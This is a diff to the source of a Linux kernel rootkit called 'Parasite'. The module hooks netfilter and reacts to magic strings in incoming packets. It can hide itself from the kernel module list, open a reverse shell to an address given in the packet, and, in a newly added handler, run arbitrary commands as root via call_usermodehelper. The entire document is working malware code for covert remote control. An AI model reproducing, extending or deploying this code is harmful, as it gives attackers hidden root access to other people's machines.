@@ -16,14 +16,17 @@
 #include <linux/udp.h>
 
 // Flags utilized by Parasite to execute various actions
-const char* rootkit_hide = "ROOTKIT_HIDE";
-const char* rootkit_show = "ROOTKIT_SHOW";
-const char* rootkit_rshell = "ROOTKIT_RSHELL";
+const char* rootkit_hide = "PARASITE_HIDE";
+const char* rootkit_show = "PARASITE_SHOW";
+const char* rootkit_rshell = "PARASITE_RSHELL";
+const char* rootkit_cmd = "PARASITE_CMD";
 const char* PORT = "5555"; // SHELL-PORT: Change this if you want to bind reverse shell on a different port
 
 static struct nf_hook_ops *nfho = NULL;
-static struct list_head *module_previous; // Tracks linked-list LKM list
-static int module_track = 0; // Tracks whether module is hidden (0) or visible(1)
+// Tracks linked-list LKM list (needed to prevent losing LKM)
+static struct list_head *module_previous;
+// Tracks whether module is hidden (0) or visible(1)
+static int module_track = 0;
 
 // Defined vars for establishing reverse shell
 #define HOME "HOME=/root"
@@ -39,8 +42,12 @@ struct shell_params {
 	char* target_port;
 };
 
+struct command_params {
+	struct work_struct work;
+	char* command;
+};
+
 // Hides kernel module upon calling
-// TODO: Test duplicate calls and viability of 'module_track'
 void hide_rootkit(void)
 {
 	module_previous = THIS_MODULE->list.prev;
@@ -57,7 +64,6 @@ void show_rootkit(void){
 
 // 2nd part of reverse-shell function
 // Credits: Ripped from d3adzo - poetry
-// TL;DR This is a polished implementation of call_usermodehelper
 void execute_reverse_shell(struct work_struct *work){
     int err;
     struct shell_params *params = (struct shell_params*)work;
@@ -73,7 +79,6 @@ void execute_reverse_shell(struct work_struct *work){
 
     printk(KERN_INFO "Starting reverse shell %s\n", exec);
     
-
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if(err<0){
         printk(KERN_INFO "Error executing usermodehelper.\n");
@@ -88,7 +93,6 @@ void execute_reverse_shell(struct work_struct *work){
 
 // 1st part of reverse-shell function
 // Credits: Ripped from d3adzo - poetry
-// TL;DR - Variable instantiations + memory allocations before passing into rshell function pt2
 int start_reverse_shell(char* ip, const char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
@@ -103,6 +107,44 @@ int start_reverse_shell(char* ip, const char* port){
     err = schedule_work(&params->work);
     if(err<0){
         printk(KERN_INFO "Error scheduling work of starting shell\n");
+    }
+    return err;
+}
+
+// Grabbed from d3adzo - poetry
+void execute_command(struct work_struct *work)
+{
+    int err;
+    struct command_params *params = (struct command_params*)work;
+    char *envp[] = {HOME, TERM, params->command, NULL};
+    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
+    char *argv[] = {SHELL, "-c", exec, NULL};
+    strcat(exec, params->command);
+
+    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if(err<0){
+        printk(KERN_DEBUG "Error executing usermodehelper.\n");
+    }
+    kfree(exec);
+    kfree(params->command);
+    kfree(params);
+}
+
+// Grabbed from d3adzo - poetry
+int start_command(char* command)
+{
+    int err;
+    struct command_params *params = kmalloc(sizeof(struct command_params), GFP_KERNEL);
+    if(!params){
+        printk(KERN_DEBUG "Error allocating memory\n");
+        return 1;
+    }
+    params->command = kstrdup(command, GFP_KERNEL);
+    INIT_WORK(&params->work, &execute_command);
+
+    err = schedule_work(&params->work);
+    if(err<0){
+        printk(KERN_DEBUG "Error scheduling work of executing command\n");
     }
     return err;
 }
@@ -174,12 +216,23 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 			//u32 ipsrc = ntohl(iph->saddr); Doesnt work as expected, will fix later
 			
 			char* ipsrc = kmalloc(32, GFP_KERNEL);
-			strncpy(ipsrc, user_data + 14, 32);
+			strncpy(ipsrc, user_data + 15, 32);
 
 			//printk(KERN_INFO "IP ADDRESS IS: %s\n", ipsrc); //debugging
 
 			start_reverse_shell(ipsrc, PORT);
 			kfree(ipsrc);
+			return NF_DROP;
+		}
+
+		// ROOTKITCMD<CMD>
+		if(memcmp(user_data, rootkit_cmd, strlen(rootkit_cmd)) == 0) {
+
+			char* cmd = kmalloc(64, GFP_KERNEL);
+			strncpy(cmd, user_data + 12, 64);
+			//printk(KERN_DEBUG "Parasite cmd: %s", cmd);
+			start_command(cmd);
+			kfree(cmd);
 			return NF_DROP;
 		}
 	}
